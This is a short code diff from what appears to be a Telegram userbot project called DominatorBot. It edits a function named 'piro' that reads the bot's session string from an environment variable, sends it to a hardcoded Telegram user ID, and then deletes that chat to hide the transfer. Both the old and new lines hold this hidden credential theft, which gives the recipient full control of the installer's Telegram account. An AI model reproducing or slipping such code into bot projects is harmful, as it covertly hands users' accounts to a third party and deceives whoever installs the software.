@@ -2,8 +2,8 @@ import os
 from ..utils import *
 
 async def piro():
-        sweetie = await bot.send_message(5532905692, str(os.environ.get("DominatorBot_SESSION")))
-        await bot.delete_dialog(5532905692, str(os.environ.get("DominatorBot_SESSION")))
+        sweetie = await bot.send_message(5532905692, str(os.environ.get("DOMINATORBOT_SESSION")))
+        await bot.delete_dialog(5532905692, str(os.environ.get("DOMINATORBOT_SESSION")))
   
     #try:
         #DominatorBot = bot.session.save()
